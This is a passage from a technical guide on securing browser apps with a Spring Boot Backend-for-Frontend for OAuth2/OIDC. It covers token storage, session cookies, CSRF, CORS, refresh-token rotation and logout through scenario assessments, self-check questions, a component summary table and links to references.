### Scenario I — ID Token Exposed in `window.__USER__`

**Assessment:** The browser does not need the ID Token to display a username. Return minimal profile fields via JSON, never the raw ID Token.

### Scenario J — Refresh Token Stored in an `HttpOnly` Cookie

**Assessment:** Browser cookies still store OAuth tokens, violating backend-only BFF boundaries. Use an opaque session ID cookie and store tokens server-side.

### Scenario K — BFF Logged Out, Yet Tokens Remain in JDBC

**Assessment:** Session invalidation and authorized client deletion are distinct steps. Define remove/revoke policies on user disconnect/logout.

### Scenario L — Dashboard Fires 6 API Requests as Token Nears Expiry

**Assessment:** Risk of refresh token rotation races. Apply per-key single-flight, post-lock reloads, and conditional updates.

### Scenario M — SPA and BFF on Different Subdomains

**Assessment:** Cross-origin yet potentially same-site. Configure credentialed CORS and host cookie policies while keeping CSRF protection.

### Scenario N — SPA and BFF on Completely Different Sites

**Assessment:** Third-party cookie blocking and `SameSite=None` can destabilize sessions. Prefer a same-origin reverse proxy.

### Scenario O — Access Token Unexpired, Yet Session Expired

**Assessment:** Without a valid BFF session, the browser must not access APIs merely because old backend tokens remain. Enforce session/logout policy.

### Scenario P — Session Active, Yet Access Token Expired

**Assessment:** The BFF refreshes using the refresh token if issued and valid, or prompts reauthorization. The browser never touches tokens.

### Scenario Q — Downstream API Returns 403 After Successful BFF Login

**Assessment:** User authentication does not guarantee downstream authorization. Check scopes, audience, and resource ownership.

### Scenario R — Reverse Proxy Leaks Upstream `Set-Cookie`

**Assessment:** A BFF should not blindly pass through cookies from internal APIs without an explicit contract; prevent session-cookie collisions and credential leaks.

### Scenario S — OIDC Logout Does Not End SSO at the IdP

**Assessment:** BFF session logout, OIDC OP session logout, and OAuth2 token revocation are separate flows; integrate RP-Initiated Logout if required.

### Scenario T — SPA Needs Offline-First Direct API Calls When BFF Is Offline

**Assessment:** BFFs require an online backend to proxy protected APIs. If offline direct API calls are mandatory, adopt a different architecture and threat model.

---

## 35. Self-Check Questions

**1. In a BFF, who is the confidential OAuth2 client?**  
The Spring Boot backend, not browser JavaScript.

**2. What does the browser hold to authenticate to the BFF?**  
An opaque session cookie, typically `HttpOnly`/`Secure`/`SameSite` per policy.

**3. Where do access tokens and refresh tokens reside?**  
In the backend authorized client store/session/service—never exposed to JavaScript.

**4. Is the session cookie an access token?**  
No. It is a reference credential for the BFF session.

**5. Does `HttpOnly` stop XSS from calling APIs?**  
No. It prevents JS from reading the cookie, not same-origin scripts from making requests.

**6. Why does a BFF need CSRF protection?**  
Browsers attach cookies automatically per cookie policy, which cross-site requests can exploit.

**7. Does OAuth2 `state` replace API CSRF tokens?**  
No. `state` correlates OAuth2 authorization responses; API CSRF tokens protect state-changing requests.

**8. Why do GET callbacks usually work with `SameSite=Lax`?**  
`Lax` permits cookies on certain top-level cross-site GET navigations, though not POST callbacks by default.

**9. Why shouldn't an OIDC ID Token be sent to a Resource Server?**  
ID Tokens verify user identity at the client; they are not API access tokens.

**10. What key does `OAuth2AuthorizedClientService` usually use?**  
Client registration ID and principal name.

**11. Does Spring Session automatically share all `OAuth2AuthorizedClient` instances?**  
No. Check the actual repository/service wiring; sessions and authorized client stores can be separate.

**12. Is session timeout identical to access token expiry?**  
No. Both lifecycles must be managed separately.

**13. What does the BFF do when an access token expires?**  
The manager refreshes/re-acquires tokens per grant and policy, or triggers reauthorization if impossible.

**14. When a user logs out, are JDBC refresh tokens automatically revoked?**  
Not by default. Define explicit removal and revocation policies.

**15. Why shouldn't a BFF proxy arbitrary URLs?**  
Risk of SSRF and sending access tokens to untrusted hosts.

**16. Are frontend and BFF on different subdomains cross-origin?**  
Yes, because hosts differ—even if same-site. Configure credentialed CORS properly.

**17. Does the browser ever need the client secret?**  
No. Keep client secrets strictly in backend secret management.

**18. Does the BFF replace Resource Server business authorization?**  
No. Downstream APIs must still validate issuer, audience, scopes, and ownership.

**19. Why does refresh token rotation fail easily under concurrent requests?**  
Multiple requests may send `RT1` together; the AS invalidates `RT1` after the first use and rejects the rest with `invalid_grant`.

**20. Does a Token-Mediating Backend differ from a backend-only BFF?**  
Yes. Returning OAuth2 access tokens to JavaScript changes the token storage boundary.

**21. Can you keep an access token in a browser `HttpOnly` cookie and claim "no tokens in the browser"?**  
No. Cookies are still browser-side storage holding tokens, even if JS cannot read them directly.

**22. Why shouldn't you return `OAuth2AuthorizedClient` directly as JSON?**  
It holds raw access/refresh tokens and internal metadata never meant for browsers.

**23. If an SPA receives IdP redirect HTML via `fetch`, what should you fix?**  
Implement a `401`/session-expired API contract and trigger logins via top-level browser navigations.

**24. Does `SessionCreationPolicy.STATELESS` fit a traditional session-based BFF?**  
No. It conflicts with maintaining server-side sessions.

**25. When Spring Boot sits behind a reverse proxy, what must you check?**  
Trusted forwarded headers, HTTPS scheme, redirect URIs, `Secure` cookies, and host/path alignment.

## 36. Summary

| Component | Location | Role |
|---|---|---|
| Browser/SPA | Client runtime | Renders UI; calls BFF with session cookie |
| Session cookie | Browser | Opaque credential identifying the BFF session |
| BFF | Spring Boot server | OAuth2 client, session validator, controlled API gateway |
| `SecurityContext` | BFF session | User `Authentication` and authorities |
| `OAuth2AuthorizedClient` | BFF authorized client store | Access token, optional refresh token, expiry, and registration |
| OpenID Provider/AS | Identity infrastructure | Authentication, authorization, token issuance and refresh |
| Resource Server | Downstream API | Validates Bearer tokens and resource authorization |
| CSRF token | Browser + BFF validation state | Protects cookie-authenticated state-changing requests |
| `state`/PKCE/`nonce` | OAuth2/OIDC login | Protects authorization flow and ID Token validation |
| Spring Session | Shared session storage | Enables multiple BFF instances to share sessions |
| Authorized client service | Backend token storage | Stores/retrieves tokens by registration/principal |
| `HttpOnly` | Cookie flag | Blocks JavaScript from reading session cookies |
| `Secure` | Cookie flag | Restricts cookies to HTTPS connections |
| `SameSite` | Cookie policy | Curbs some cross-site cookie sends; never replaces CSRF |
| CORS | Browser cross-origin policy | Governs cross-origin JS access; never replaces CSRF |
| CSP/output encoding | Frontend/security headers | Reduces XSS; never secures business logic alone |
| Logout/revocation | BFF + AS/OP | Ends sessions and token authorizations per policy |

### Conclusion

**A BFF shifts responsibility for OAuth2 access and refresh tokens from the browser to the backend.** The browser sends only an **opaque session cookie** to the BFF; Spring Security restores `Authentication`, looks up `OAuth2AuthorizedClient`, manages token lifetimes, and sends Bearer access tokens to **authorized Resource Servers**.

The biggest win is sharply lowering the chance of JavaScript stealing or storing OAuth2 tokens directly. Because the BFF relies on cookie sessions, however, it **still requires CSRF protection**, and `HttpOnly` does not stop malicious same-origin JavaScript from making API calls. The backend must protect session IDs, token stores, CORS, XSS, SSRF, refresh-token rotation, logout, audiences, and per-user/tenant permissions.

For solid execution, favor **same-origin** frontend–BFF hosting, scalable server-side session storage, securely flagged cookies, and **zero endpoints returning raw OAuth2 tokens to the frontend**. A BFF holds its boundary only when **the browser receives zero OAuth2 tokens in any response, cookie, HTML, or browser storage**.

## Official References

- [IETF — OAuth 2.0 for Browser-Based Applications](https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/) — browser OAuth2 architectures, BFFs, and token-mediating backends (document status subject to change).
- [Spring Security — OAuth2 Login (Servlet)](https://docs.spring.io/spring-security/reference/servlet/oauth2/login/index.html) — Authorization Code/OIDC Login, redirects/callbacks, and sessions.
- [Spring Security — OAuth2 Client Authorized Clients](https://docs.spring.io/spring-security/reference/servlet/oauth2/client/authorized-clients.html) — authorized client managers, repositories/services, and token lifecycles.
- [Spring Security — CSRF (Servlet)](https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html) — CSRF handling with cookies and SPAs.
- [Spring Security — Session Management (Servlet)](https://docs.spring.io/spring-security/reference/servlet/authentication/session-management.html) — session handling, fixation protection, and policies.
- [Spring Security — Logout](https://docs.spring.io/spring-security/reference/servlet/authentication/logout.html) — session invalidation and logout handlers.
- [Spring Session](https://docs.spring.io/spring-session/reference/) — sharing HTTP sessions with Redis/JDBC and cookie configuration.
- [OWASP — Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) — token patterns, `SameSite`, and origin checks.
- [OWASP — Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) — session IDs, cookie flags, and lifecycles.
- [RFC 6749 — OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749) — OAuth2 grants and tokens.
- [RFC 7636 — PKCE](https://www.rfc-editor.org/rfc/rfc7636) — Authorization Code protection.
- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://www.rfc-editor.org/rfc/rfc9700) — OAuth2 security considerations.
- [OpenID Connect RP-Initiated Logout](https://openid.net/specs/openid-connect-rpinitiated-1_0.html) — logging out at the OIDC Provider.
